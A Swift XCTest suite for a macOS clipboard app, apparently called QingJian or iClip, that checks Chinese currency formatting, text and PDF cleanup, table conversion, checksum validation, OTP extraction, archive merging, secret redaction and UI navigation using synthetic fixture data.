import XCTest
import CoreImage
import Carbon
import CryptoKit
@testable import QingJian

final class CoreFeatureTests: XCTestCase {

    // MARK: - 1. 会计国标人民币大写零误差边界测试

    func testChineseUppercaseRMB_ZeroAndDecimals() {
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "0", fracDigits: nil), "零元整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "0", fracDigits: "00"), "零元整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "0", fracDigits: "05"), "伍分")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "0", fracDigits: "5"), "伍角整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "0", fracDigits: "56"), "伍角陆分")
    }

    func testChineseUppercaseRMB_ComplexZeroRules() {
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "10", fracDigits: "05"), "壹拾元零伍分")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "10", fracDigits: "50"), "壹拾元伍角整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "1005", fracDigits: nil), "壹仟零伍元整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "10200", fracDigits: nil), "壹万零贰佰元整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "100000", fracDigits: nil), "壹拾万元整")
        // 跨万级全零：1_0000_0005 应读作「壹亿零伍元整」，绝不能出现「万」字
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "100000005", fracDigits: nil), "壹亿零伍元整")
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "128560", fracDigits: "50"), "壹拾贰万捌仟伍佰陆拾元伍角整")
        // 经典浮点陷阱值 19.99 / 999999999999.99 零精度丢失
        XCTAssertEqual(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "19", fracDigits: "99"), "壹拾玖元玖角玖分")
        XCTAssertNotNil(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "999999999999", fracDigits: "99"))
        // 超过 12 位千亿上限安全返回 nil
        XCTAssertNil(FinanceNumberEngine.toChineseUppercaseRMB(intDigits: "1000000000000", fracDigits: "00"))
    }

    // MARK: - 2. 防误判守卫测试（手机号 / 时间戳 / 年份 / 外币）

    func testFinanceFalsePositiveGuards() {
        // 11 位中国大陆手机号绝不能误判为金额
        XCTAssertTrue(FinanceNumberEngine.analyze("13800138000").isEmpty)
        // 10 位与 13 位 Unix 时间戳绝不能误判为金额
        XCTAssertTrue(FinanceNumberEngine.analyze("1763744800").isEmpty)
        XCTAssertTrue(FinanceNumberEngine.analyze("1763744800123").isEmpty)
        // 单独年份 2026 不误判，但 ¥2026 或 2,026.50 正常识别
        XCTAssertTrue(FinanceNumberEngine.analyze("2026").isEmpty)
        XCTAssertFalse(FinanceNumberEngine.analyze("¥2026").isEmpty)
        XCTAssertFalse(FinanceNumberEngine.analyze("¥128,560.50").isEmpty)

        // 美元符号只提供纯数字提取，不错误生成「人民币元整」
        let usdActions = FinanceNumberEngine.analyze("$1,280.50")
        XCTAssertFalse(usdActions.contains(where: { $0.id == "fin-rmb-upper" }))
        XCTAssertEqual(usdActions.first(where: { $0.id == "fin-plain-num" })?.resultText, "1280.50")
    }

    // MARK: - 3. 多行报销/报价账单精确求和与防重累加测试

    func testMultilineBillExactDecimalSum() {
        let bill = """
        高铁差旅 ¥1,280.50
        酒店住宿 680
        市内打车 95.55元
        合计：99999
        """
        let actions = FinanceNumberEngine.analyze(bill)
        let sumOnly = actions.first(where: { $0.id == "bill-sum-only" })
        // 1280.50 + 680 + 95.55 = 2056.05，且自动忽略已有的「合计：99999」行
        XCTAssertEqual(sumOnly?.resultText, "2056.05")

        let withFooter = actions.first(where: { $0.id == "bill-append-total" })
        XCTAssertTrue(withFooter?.resultText.contains("贰仟零伍拾陆元零伍分") == true)

        // 代码片段绝不能误判为多行账单
        let codeSnippet = """
        let width = 420;
        let height = 560;
        """
        XCTAssertTrue(FinanceNumberEngine.analyze(codeSnippet).isEmpty)
    }

    // MARK: - 4. 跨角色持久化 Schema 向后兼容与无损往返测试

    func testClipItemCrossEditionLosslessPersistence() throws {
        let item = ClipItem(
            type: .image,
            imageFileName: "test.png",
            imageWidth: 800,
            imageHeight: 600,
            ocrText: "发票号码 12345678",
            ocrChecked: true,
            contentHash: "img:abc",
            sourceAppName: "预览",
            isPinned: true,
            pinCategory: .invoice,
            customAlias: "11月差旅电子发票"
        )
        let data = try JSONEncoder().encode([item])
        let decoded = try JSONDecoder().decode([ClipItem].self, from: data)
        XCTAssertEqual(decoded.count, 1)
        XCTAssertEqual(decoded[0].ocrText, "发票号码 12345678")
        XCTAssertEqual(decoded[0].ocrChecked, true)
        XCTAssertEqual(decoded[0].pinCategory, .invoice)
        XCTAssertEqual(decoded[0].customAlias, "11月差旅电子发票")
        XCTAssertEqual(decoded[0].primaryTitle, "11月差旅电子发票")

        // 模拟旧版 v1.7.x 不含新字段的 history.json 无缝解码
        let legacyJSON = """
        [{"id":"E621E1F8-C36C-495A-93FC-0C247A3E6E5F","type":"text","text":"Hello","contentHash":"text:1","createdAt":0,"isPinned":false}]
        """.data(using: .utf8)!
        let legacyDecoded = try JSONDecoder().decode([ClipItem].self, from: legacyJSON)
        XCTAssertEqual(legacyDecoded.first?.text, "Hello")
        XCTAssertNil(legacyDecoded.first?.pinCategory)
    }

    // MARK: - 5. PDF 断行智能愈合与盘古中英排版边界测试

    func testPDFLineBreakHealingAndHyphenation() {
        let brokenEnglishPDF = """
        Modern transformer archi-
        tectures achieve state-of-the-
        art accuracy in real-time tasks.

        1. First key contribution
        2. Second key contribution
        """
        let healed = DocumentTypographyEngine.healPDFLineBreaks(brokenEnglishPDF)
        XCTAssertTrue(healed.contains("architectures achieve state-of-the-art accuracy in real-time tasks."))
        // 真实空行分段与列表项必须完整保留，不被粘成一坨
        XCTAssertTrue(healed.contains("\n\n1. First key contribution\n\n2. Second key contribution"))

        let brokenChinesePDF = """
        在跨语言合同与双栏学术论文阅读场景下，复制出
        来的文字经常在句中出现硬折行，严重影响大模型翻
        译与笔记摘录体验。
        """
        let healedCN = DocumentTypographyEngine.healPDFLineBreaks(brokenChinesePDF)
        XCTAssertEqual(healedCN, "在跨语言合同与双栏学术论文阅读场景下，复制出来的文字经常在句中出现硬折行，严重影响大模型翻译与笔记摘录体验。")
    }

    func testPanguSpacingProtectsURLsAndCode() {
        let messy = "使用iClip在macOS15上提升300%效率，详见https://github.com/fanaruto/iClip仓库"
        let spaced = DocumentTypographyEngine.applyPanguSpacing(messy)
        XCTAssertEqual(spaced, "使用 iClip 在 macOS15 上提升 300% 效率，详见 https://github.com/fanaruto/iClip 仓库")

        // 代码块绝不能误触发 PDF 断行或盘古排版
        let swiftCode = """
        func computeValue(x: Int) -> Int {
            let result = x * 2
            return result
        }
        """
        XCTAssertTrue(DocumentTypographyEngine.analyze(swiftCode).isEmpty)
    }

    // MARK: - 6. 二维表格协议双向无损转换与防代码缩进误判测试

    func testMarkdownAndExcelTSVTableBridge() {
        let mdTable = """
        | **商品名称** | 单价 | 库存 |
        | :--- | ---: | :---: |
        | iClip Pro | 0.00 | 999 |
        | 液态贴膜,高清 | 39.90 | 50 |
        """
        let mdActions = TableBridgeEngine.analyze(mdTable)
        let excelTSV = mdActions.first(where: { $0.id == "tbl-md-to-excel" })?.resultText
        XCTAssertEqual(excelTSV, "商品名称\t单价\t库存\niClip Pro\t0.00\t999\n液态贴膜,高清\t39.90\t50")

        // CSV 对包含逗号的单元格必须自动加双引号保护
        let csv = mdActions.first(where: { $0.id == "tbl-md-to-csv" })?.resultText
        XCTAssertTrue(csv?.contains("\"液态贴膜,高清\",39.90,50") == true)

        // HTML Table 双协议校验
        let html = TableBridgeEngine.toHTMLTable(fromTSV: excelTSV ?? "")
        XCTAssertTrue(html?.contains("<th>商品名称</th>") == true)
        XCTAssertTrue(html?.contains("<td>999</td>") == true)

        // Excel TSV 逆向转 Markdown 与 JSON 对象数组
        let tsvInput = "姓名\t部门\t职级\n张三\t研发\tP7\n李四\t电商运营\tP6"
        let tsvActions = TableBridgeEngine.analyze(tsvInput)
        let backToMD = tsvActions.first(where: { $0.id == "tbl-tsv-to-md" })?.resultText
        XCTAssertTrue(backToMD?.contains("| 姓名 | 部门 | 职级 |") == true)
        let toJSON = tsvActions.first(where: { $0.id == "tbl-tsv-to-json" })?.resultText
        XCTAssertTrue(toJSON?.contains("\"部门\" : \"电商运营\"") == true)

        // Tab 缩进的代码块严禁误判为 Excel TSV 表格
        let tabIndentedCode = "\tlet a = 1\n\tlet b = 2"
        XCTAssertTrue(TableBridgeEngine.analyze(tabIndentedCode).isEmpty)
    }

    // MARK: - 7. 图像工坊透明通道防黑底瘦身与圆角样机渲染测试

    func testImageStudioCompressionAndMockupRendering() throws {
        let tempURL = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-studio-test-\(UUID().uuidString).png")
        defer { try? FileManager.default.removeItem(at: tempURL) }

        // 生成一张 400x300 全透明背景 + 中心蓝色块测试 PNG
        let colorSpace = CGColorSpaceCreateDeviceRGB()
        guard let ctx = CGContext(
            data: nil,
            width: 400,
            height: 300,
            bitsPerComponent: 8,
            bytesPerRow: 0,
            space: colorSpace,
            bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
        ) else {
            XCTFail("Failed to create test CGContext")
            return
        }
        ctx.clear(CGRect(x: 0, y: 0, width: 400, height: 300))
        ctx.setFillColor(CGColor(red: 0.1, green: 0.4, blue: 0.9, alpha: 1.0))
        ctx.fill(CGRect(x: 100, y: 80, width: 200, height: 140))

        guard let cgImg = ctx.makeImage() else {
            XCTFail("Failed to make test CGImage")
            return
        }
        let rep = NSBitmapImageRep(cgImage: cgImg)
        let pngData = try XCTUnwrap(rep.representation(using: .png, properties: [:]))
        try pngData.write(to: tempURL)

        // 1. 验证 JPEG 瘦身成功且左上角原透明区域被垫为纯白（RGB > 245，绝不变纯黑）
        let jpegRes = try XCTUnwrap(ImageStudioEngine.compressToLightweightJPEG(at: tempURL))
        XCTAssertGreaterThan(jpegRes.byteCount, 100)
        let decodedJPEG = try XCTUnwrap(NSBitmapImageRep(data: jpegRes.data))
        XCTAssertEqual(decodedJPEG.pixelsWide, 400)
        XCTAssertEqual(decodedJPEG.pixelsHigh, 300)
        let cornerColor = try XCTUnwrap(decodedJPEG.colorAt(x: 5, y: 5)?.usingColorSpace(.sRGB))
        XCTAssertGreaterThan(cornerColor.redComponent, 0.95)
        XCTAssertGreaterThan(cornerColor.greenComponent, 0.95)
        XCTAssertGreaterThan(cornerColor.blueComponent, 0.95)

        // 2. 验证圆角阴影样机加壳输出尺寸精确加上了四周留白（400 + 40*2 = 480, 300 + 40*2 = 380）
        let mockupRes = try XCTUnwrap(ImageStudioEngine.renderAppleMockupFrame(at: tempURL))
        let decodedMockup = try XCTUnwrap(NSBitmapImageRep(data: mockupRes.data))
        XCTAssertEqual(decodedMockup.pixelsWide, 480)
        XCTAssertEqual(decodedMockup.pixelsHigh, 380)
    }

    // MARK: - 8. 法务与出纳离线国标校验（身份证 GB11643 / 企业税号 GB32100 / 银行卡 Luhn）测试

    func testComplianceCodeVerificationAndFormatting() {
        // 1. 构造合法的 18 位身份证号（11010519900307123 -> 计算国标校验位）
        let id17 = "11010519900307123"
        let expectedIDCheck = ComplianceCodeEngine.expectedIDCardChecksum(first17: id17)
        XCTAssertNotNil(expectedIDCheck)
        let validID = id17 + String(expectedIDCheck!)
        let idActions = ComplianceCodeEngine.analyze(validID)
        XCTAssertEqual(idActions.first(where: { $0.id == "comp-id-group" })?.resultText, "110105 19900307 123\(expectedIDCheck!)")

        // 故意输错末位，验证引擎精准检出错误并给出正确末位修正值
        let wrongLast: Character = (expectedIDCheck == "X") ? "0" : "X"
        let typoID = id17 + String(wrongLast)
        let typoActions = ComplianceCodeEngine.analyze(typoID)
        XCTAssertEqual(typoActions.first?.id, "comp-id-invalid")
        XCTAssertEqual(typoActions.first?.resultText, validID)

        // 2. 构造合法的 18 位统一社会信用代码（GB 32100）
        let uscc17 = "91440300192203821"
        let expectedUSCC = ComplianceCodeEngine.expectedUSCCChecksum(first17: uscc17)
        XCTAssertNotNil(expectedUSCC)
        let validUSCC = uscc17 + String(expectedUSCC!)
        let usccActions = ComplianceCodeEngine.analyze(validUSCC)
        XCTAssertTrue(usccActions.contains(where: { $0.id == "comp-uscc-group" }))

        // 模拟财务把税号里的 0 手误敲成字母 O，验证自动纠错检出
        let typoUSCC = validUSCC.replacingOccurrences(of: "0300", with: "O3OO")
        let fixUSCC = ComplianceCodeEngine.analyze(typoUSCC)
        XCTAssertEqual(fixUSCC.first?.id, "comp-uscc-fix")
        XCTAssertEqual(fixUSCC.first?.resultText, validUSCC)

        // 3. 标准银联 16 位卡号 Luhn 校验与四位分节
        let base15 = "622202100111222"
        var validLuhnCard = ""
        for d in 0...9 {
            let cand = base15 + "\(d)"
            if ComplianceCodeEngine.passesLuhnCheck(cand) {
                validLuhnCard = cand
                break
            }
        }
        XCTAssertFalse(validLuhnCard.isEmpty)
        let cardActions = ComplianceCodeEngine.analyze(validLuhnCard)
        XCTAssertTrue(cardActions.contains(where: { $0.id == "comp-card-group" }))
        XCTAssertTrue(cardActions.contains(where: { $0.id == "comp-card-mask" }))
    }

    // MARK: - 9. 一次性验证码（OTP）抗干扰提取与会议逐字稿时间轴清洗测试

    func testOTPExtractionAndNoiseImmunity() {
        // 含尾号、日期、金额、分钟数多重数字干扰的银行验证码短信
        let bankSMS = "【招商银行】您尾号8899的储蓄卡于2026-11-22消费¥1280.50元，动态验证码为 654321，请在5分钟内完成验证。"
        XCTAssertEqual(MeetingAndEphemeralEngine.extractVerificationCode(from: bankSMS), "654321")

        // 验证码在前、英文关键词在后
        let openaiSMS = "[OpenAI] 918273 is your security code. Expires in 10 minutes."
        XCTAssertEqual(MeetingAndEphemeralEngine.extractVerificationCode(from: openaiSMS), "918273")

        // 关键词与验证码中间隔着产品名
        let appleSMS = "Your verification code for Apple ID is 739104. Do not share it with anyone."
        XCTAssertEqual(MeetingAndEphemeralEngine.extractVerificationCode(from: appleSMS), "739104")

        // 字母+数字混合网盘提取码
        let shareCode = "通过网盘分享的文件，提取码：G7k9，24小时内有效"
        XCTAssertEqual(MeetingAndEphemeralEngine.extractVerificationCode(from: shareCode), "G7k9")

        // 防误判：纯 6 位股票代码、普通会议通知、不含数字的验证码提示均不误触发
        XCTAssertNil(MeetingAndEphemeralEngine.extractVerificationCode(from: "600519"))
        XCTAssertNil(MeetingAndEphemeralEngine.extractVerificationCode(from: "今天下午 14:30 在 1002 会议室讨论方案"))
        XCTAssertNil(MeetingAndEphemeralEngine.extractVerificationCode(from: "请先获取短信验证码后再登录系统"))
    }

    func testMeetingTranscriptCleaningAndLogExclusion() throws {
        // 1. 飞书妙记 / 腾讯会议格式（含同一发言人连续碎片合并）
        let feishuTranscript = """
        张总监 00:01:12
        今天我们对齐一下大客户合同交付排期
        张总监 00:01:19
        重点看下第三条违约金比例。
        李律师 00:01:35
        建议违约金上限控制在合同总额的 20% 以内。
        """
        let res = try XCTUnwrap(MeetingAndEphemeralEngine.cleanMeetingTranscript(feishuTranscript))
        XCTAssertEqual(res.removedTimestampCount, 3)
        XCTAssertEqual(res.plainBody, "今天我们对齐一下大客户合同交付排期，重点看下第三条违约金比例。建议违约金上限控制在合同总额的 20% 以内。")
        XCTAssertEqual(
            res.speakerMergedDialogue,
            "张总监：今天我们对齐一下大客户合同交付排期，重点看下第三条违约金比例。\n李律师：建议违约金上限控制在合同总额的 20% 以内。"
        )

        // 2. SRT 双语/视频字幕块剥离序号与时间轴
        let srtBlock = """
        1
        00:00:01,200 --> 00:00:04,500
        大家好，欢迎来到新品演示。

        2
        00:00:04,800 --> 00:00:08,150
        今天发布极简与全能兼备的新版本。
        """
        let srtRes = try XCTUnwrap(MeetingAndEphemeralEngine.cleanMeetingTranscript(srtBlock))
        XCTAssertEqual(srtRes.plainBody, "大家好，欢迎来到新品演示。今天发布极简与全能兼备的新版本。")
        XCTAssertNil(srtRes.speakerMergedDialogue)

        // 3. 服务器运维日志严禁误判为会议逐字稿
        let serverLogs = """
        [10:12:01] [ERROR] Redis connection timeout pid=4821
        [10:12:05] [WARN] Retrying upstream connection
        """
        XCTAssertNil(MeetingAndEphemeralEngine.cleanMeetingTranscript(serverLogs))
    }

    // MARK: - 10. 置顶收藏与模板自包含归档（.iclip）跨机迁移与幂等去重合并测试

    func testPinnedArchiveExportAndNonDestructiveMerge() throws {
        let fm = FileManager.default
        let srcImgDir = fm.temporaryDirectory.appendingPathComponent("iclip-arch-src-\(UUID().uuidString)", isDirectory: true)
        let dstImgDir = fm.temporaryDirectory.appendingPathComponent("iclip-arch-dst-\(UUID().uuidString)", isDirectory: true)
        try fm.createDirectory(at: srcImgDir, withIntermediateDirectories: true)
        try fm.createDirectory(at: dstImgDir, withIntermediateDirectories: true)
        defer {
            try? fm.removeItem(at: srcImgDir)
            try? fm.removeItem(at: dstImgDir)
        }

        // 无固定项时导出应明确拒绝并抛出 .noPinnedItems
        let unpinnedSecret = ClipItem(
            type: .text,
            text: "临时短信验证码 839201",
            contentHash: "text:ephemeral-1",
            isPinned: false
        )
        XCTAssertThrowsError(try ArchiveBackupService.exportPinnedArchiveData(from: [unpinnedSecret], imagesDirectoryURL: srcImgDir)) { err in
            XCTAssertEqual(err as? ArchiveBackupError, .noPinnedItems)
        }

        // 准备真实 1x1 PNG 数据写入源图片目录
        let fakePNGBytes = Data([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x01, 0x02, 0x03])
        let srcImageName = "pinned-qr.png"
        try fakePNGBytes.write(to: srcImgDir.appendingPathComponent(srcImageName))

        let pinnedInvoice = ClipItem(
            type: .text,
            text: "公司名称：轻剪科技有限公司\n税号：91440300MA5F123456",
            contentHash: "text:invoice-01",
            isPinned: true,
            pinCategory: .invoice,
            customAlias: "深圳总部开票资料"
        )
        let pinnedQRImage = ClipItem(
            type: .image,
            imageFileName: srcImageName,
            imageWidth: 320,
            imageHeight: 320,
            ocrText: "企业对公收款码",
            ocrChecked: true,
            contentHash: "img:qr-01",
            isPinned: true,
            pinCategory: .reply,
            customAlias: "商务收款二维码"
        )

        // 1. 导出：验证未固定的临时记录绝不被打包进 .iclip
        let archiveData = try ArchiveBackupService.exportPinnedArchiveData(
            from: [unpinnedSecret, pinnedInvoice, pinnedQRImage],
            imagesDirectoryURL: srcImgDir,
            appVersion: "2.0.0",
            editionKey: "flow"
        )
        let archiveJSONStr = try XCTUnwrap(String(data: archiveData, encoding: .utf8))
        XCTAssertFalse(archiveJSONStr.contains("839201"))
        XCTAssertTrue(archiveJSONStr.contains("深圳总部开票资料"))

        // 2. 目标机器已有本地记录 + 一条同哈希但未固定无备注的相同开票文本
        let localNote = ClipItem(type: .text, text: "本地草稿笔记", contentHash: "text:local-draft", isPinned: false)
        let localUnpinnedInvoice = ClipItem(
            type: .text,
            text: pinnedInvoice.text,
            contentHash: "text:invoice-01",
            isPinned: false,
            pinCategory: nil,
            customAlias: nil
        )

        let (mergedOnce, summaryOnce) = try ArchiveBackupService.mergeArchiveData(
            archiveData,
            into: [localNote, localUnpinnedInvoice],
            imagesDirectoryURL: dstImgDir
        )
        XCTAssertEqual(summaryOnce.totalInBundle, 2)
        XCTAssertEqual(summaryOnce.importedNewCount, 1)      // 图片收款码为全新导入
        XCTAssertEqual(summaryOnce.updatedExistingCount, 1)  // 开票资料自动补齐置顶、分组与备注
        XCTAssertEqual(mergedOnce.count, 3)                  // 本地草稿完好无损

        let upgradedInvoice = try XCTUnwrap(mergedOnce.first(where: { $0.contentHash == "text:invoice-01" }))
        XCTAssertTrue(upgradedInvoice.isPinned)
        XCTAssertEqual(upgradedInvoice.pinCategory, .invoice)
        XCTAssertEqual(upgradedInvoice.customAlias, "深圳总部开票资料")

        let restoredQR = try XCTUnwrap(mergedOnce.first(where: { $0.contentHash == "img:qr-01" }))
        XCTAssertTrue(restoredQR.isPinned)
        XCTAssertEqual(restoredQR.ocrText, "企业对公收款码")
        let restoredFileName = try XCTUnwrap(restoredQR.imageFileName)
        let restoredURL = dstImgDir.appendingPathComponent(restoredFileName)
        let restoredRawCipher = try Data(contentsOf: restoredURL)
        XCTAssertTrue(restoredRawCipher.starts(with: LocalVaultCrypto.imageEncryptedMagic))
        XCTAssertEqual(LocalVaultCrypto.readDecryptedImageData(at: restoredURL), fakePNGBytes)

        // 3. 幂等性验证：二次重复导入同一归档包零重复膨胀
        let (mergedTwice, summaryTwice) = try ArchiveBackupService.mergeArchiveData(
            archiveData,
            into: mergedOnce,
            imagesDirectoryURL: dstImgDir
        )
        XCTAssertEqual(summaryTwice.importedNewCount, 0)
        XCTAssertEqual(summaryTwice.updatedExistingCount, 0)
        XCTAssertEqual(mergedTwice.count, 3)

        // 4. 非法文件防御验证
        let invalidData = "{\"hello\":\"world\"}".data(using: .utf8)!
        XCTAssertThrowsError(try ArchiveBackupService.mergeArchiveData(invalidData, into: [], imagesDirectoryURL: dstImgDir)) { err in
            XCTAssertEqual(err as? ArchiveBackupError, .invalidArchiveFormat)
        }
    }

    // MARK: - 11. 性能开销基准门禁（2MB 大文本摘要 O(1) 截断 + 500 条零堆分配检索）

    func testPerformanceBenchmark_LargePayloadAndZeroAllocSearch() {
        // 构造一条 2.1 MB 的巨型日志/JSON 文本与 500 条混合历史记录
        let chunk = String(repeating: "2026-11-22T10:00:00Z service=gateway latency_ms=12 status=200\n", count: 35_000)
        let hugeItem = ClipItem(type: .text, text: chunk, contentHash: "text:huge-2mb")

        var dataset: [ClipItem] = [hugeItem]
        dataset.reserveCapacity(501)
        for idx in 1...500 {
            dataset.append(ClipItem(
                type: .text,
                text: "订单编号 ORD-2026-\(idx) 客户回款金额 ¥\(idx * 128).50 联系人张经理",
                contentHash: "text:\(idx)",
                sourceAppName: "飞书"
            ))
        }

        let start = CFAbsoluteTimeGetCurrent()
        // 连续执行 200 次 2MB 大文本预览与字数读取（必须 O(1) 瞬时返回）
        for _ in 0..<200 {
            _ = hugeItem.primaryTitle
            _ = hugeItem.subtitleInfo
        }
        // 在 501 条记录（含 2.1MB 大文本）中执行不区分大小写检索
        let matched = dataset.filter { $0.matches(query: "ord-2026-499") }
        let elapsedMs = (CFAbsoluteTimeGetCurrent() - start) * 1000.0

        XCTAssertEqual(matched.count, 1)
        XCTAssertLessThan(hugeItem.rawContentPreview.utf16.count, 250)
        XCTAssertTrue(hugeItem.subtitleInfo.contains("MB"))
        // 硬门禁：全套操作必须在 25ms 以内完成（实测通常 < 3ms）
        XCTAssertLessThan(elapsedMs, 25.0, "性能退化告警：耗时 \(elapsedMs) ms 超过阈值")
    }

    // MARK: - 12. 语义脱敏、净链与动态模板回归测试

    #if !ICLIP_EDITION_FLOW
    func testSemanticRedactionAndTemplateInterpolation() {
        let envText = "OPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnop\nDB_PASSWORD=\"superSecret999\""
        let redacted = SemanticEngine.redactSecrets(in: envText)
        XCTAssertFalse(redacted.contains("1234567890abcdefghijklmnop"))
        XCTAssertFalse(redacted.contains("superSecret999"))
        XCTAssertTrue(redacted.contains("DB_PASSWORD=\"***REDACTED***\""))

        let dirty = "https://webfooo.com/article?id=42&utm_source=twitter&spm=a2c.11"
        XCTAssertEqual(SemanticEngine.cleanTrackingURL(dirty), "https://webfooo.com/article?id=42")

        let tpl = "请审查：\n{{clip_redacted}}"
        let rendered = SnippetTemplateEngine.render(template: tpl, latestContextText: "token: sk-1234567890abcdefghij1234")
        XCTAssertTrue(rendered.contains("sk-***REDACTED***"))
    }
    #endif

    // MARK: - 13. 图片 3 列网格二维方向键导航（↑↓←→）回归测试

    func testGridNavigation2DImageRowsAndColumnMemory() {
        // 布局：5 张连续图片（2 行：[0,1,2], [3,4]）+ 1 条普通文本（[5]）+ 3 张图片（[6,7,8]）
        let imageIndices: Set<Int> = [0, 1, 2, 3, 4, 6, 7, 8]
        let rows = GridNavigationHelper.buildVisualRows(count: 9, imageColumns: 3) { imageIndices.contains($0) }
        XCTAssertEqual(rows, [[0, 1, 2], [3, 4], [5], [6, 7, 8]])

        // 1. 第 1 行第 2 列 (idx=1) 按 ↓ -> 精准落到第 2 行第 2 列 (idx=4)
        let step1 = GridNavigationHelper.nextIndex(from: 1, direction: .down, visualRows: rows, preferredColumn: nil)
        XCTAssertEqual(step1.index, 4)
        XCTAssertEqual(step1.preferredColumn, 1)

        // 2. 第 1 行第 3 列 (idx=2) 按 ↓ -> 第 2 行只有 2 张图，落到尾张 (idx=4)，但仍记忆第 3 列 (col=2)
        let step2 = GridNavigationHelper.nextIndex(from: 2, direction: .down, visualRows: rows, preferredColumn: nil)
        XCTAssertEqual(step2.index, 4)
        XCTAssertEqual(step2.preferredColumn, 2)

        // 3. 继续按 ↓ 跨过单行文本 (idx=5) 再按 ↓ -> 回到第 3 列 (idx=8)
        let step3 = GridNavigationHelper.nextIndex(from: step2.index, direction: .down, visualRows: rows, preferredColumn: step2.preferredColumn)
        XCTAssertEqual(step3.index, 5)
        let step4 = GridNavigationHelper.nextIndex(from: step3.index, direction: .down, visualRows: rows, preferredColumn: step3.preferredColumn)
        XCTAssertEqual(step4.index, 8)

        // 4. 左右方向键在网格中丝滑移动并同步列记忆
        let leftMove = GridNavigationHelper.nextIndex(from: 1, direction: .left, visualRows: rows, preferredColumn: 1)
        XCTAssertEqual(leftMove.index, 0)
        XCTAssertEqual(leftMove.preferredColumn, 0)

        let rightMove = GridNavigationHelper.nextIndex(from: 0, direction: .right, visualRows: rows, preferredColumn: 0)
        XCTAssertEqual(rightMove.index, 1)
        XCTAssertEqual(rightMove.preferredColumn, 1)
    }

    // MARK: - 14. 拖拽内容到 iClip 复制类型校验测试

    func testDragAndDropPasteboardTypeRecognition() {
        let dragPB = NSPasteboard.withUniqueName()
        defer { dragPB.releaseGlobally() }

        XCTAssertFalse(ClipboardStore.canAcceptDrag(from: dragPB))

        dragPB.clearContents()
        dragPB.setString("拖拽测试文本", forType: .string)
        XCTAssertTrue(ClipboardStore.canAcceptDrag(from: dragPB))

        dragPB.clearContents()
        dragPB.setString("https://github.com/fanaruto/iClip", forType: .URL)
        XCTAssertTrue(ClipboardStore.canAcceptDrag(from: dragPB))
    }

    // MARK: - 15. 首次打开「核心亮点速览」展示与关闭回归测试

    @MainActor
    func testCoreHighlightsShowAndDismiss() {
        let ctrl = InteractivePlaygroundController.shared
        XCTAssertEqual(InteractivePlaygroundController.coreHighlights.count, 4)
        XCTAssertEqual(InteractivePlaygroundController.coreHighlights.first?.title, "唤醒零失焦直贴")
        ctrl.showHighlights()
        XCTAssertTrue(ctrl.isActive)
        ctrl.dismiss()
        XCTAssertFalse(ctrl.isActive)
    }

    // MARK: - 16. 自适应心智引擎：上下文习惯排序、晋升契约、忽略退避与高频复用记忆测试

    @MainActor
    func testAdaptiveIntelligenceLearningRankingAndAutoPromotion() throws {
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-adaptive-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)

        // 1. 模拟在 Cursor 中用户连续 2 次选择「压缩单行 JSON」，验证该来源应用下自动置顶且解锁「设为自动」契约检查
        let actions = ["json-pretty", "json-minify"]
        XCTAssertEqual(engine.rankActions(actions, idOf: { $0 }, sourceApp: "Cursor"), ["json-pretty", "json-minify"])

        engine.recordActionUsed(actionID: "json-minify", sourceApp: "Cursor")
        engine.recordActionUsed(actionID: "json-minify", sourceApp: "Cursor")
        XCTAssertEqual(engine.rankActions(actions, idOf: { $0 }, sourceApp: "Cursor"), ["json-minify", "json-pretty"])
        XCTAssertTrue(engine.isHabitPreferred(actionID: "json-minify", sourceApp: "Cursor"))

        // 2. 验证连续采纳 clean-url 后在微星标候选中点亮「设为自动（promotableRule）」
        engine.recordActionUsed(actionID: "clean-url", sourceApp: "Safari")
        engine.recordActionUsed(actionID: "clean-url", sourceApp: "Safari")
        let dirtyLink = ClipItem(
            type: .link,
            text: "https://webfooo.com/p?id=1&utm_source=x&utm_medium=social",
            contentHash: "link:dirty-test",
            sourceAppName: "Safari"
        )
        let spark = try XCTUnwrap(engine.evaluateSparkCandidate(for: dirtyLink, reuseCount: 1, minimalMode: false))
        XCTAssertEqual(spark.actionID, "clean-url")
        XCTAssertEqual(spark.promotableRule, .cleanTrackingURL)

        // 3. 验证用户连续点击 2 次 × 显式关闭某类推荐后自动习得退避静默
        engine.recordSparkExplicitDismiss(actionID: "clean-url", categoryKey: "url_tracking", sourceApp: "Safari")
        engine.recordSparkExplicitDismiss(actionID: "clean-url", categoryKey: "url_tracking", sourceApp: "Safari")
        XCTAssertNil(engine.evaluateSparkCandidate(for: dirtyLink, reuseCount: 1, minimalMode: false))

        // 4. 验证未收藏普通条目复用达到 3 次时触发「一键收藏」高粘性推荐
        let plainNote = ClipItem(type: .text, text: "公司统一开票抬头：上海怀道科技有限公司", contentHash: "text:company-title")
        _ = engine.recordContentActivity(contentHash: plainNote.contentHash)
        _ = engine.recordContentActivity(contentHash: plainNote.contentHash)
        let thirdCount = engine.recordContentActivity(contentHash: plainNote.contentHash)
        XCTAssertEqual(thirdCount, 3)
        let pinSpark = try XCTUnwrap(engine.evaluateSparkCandidate(for: plainNote, reuseCount: thirdCount, minimalMode: false))
        XCTAssertEqual(pinSpark.actionID, "habit-pin-frequent")
    }

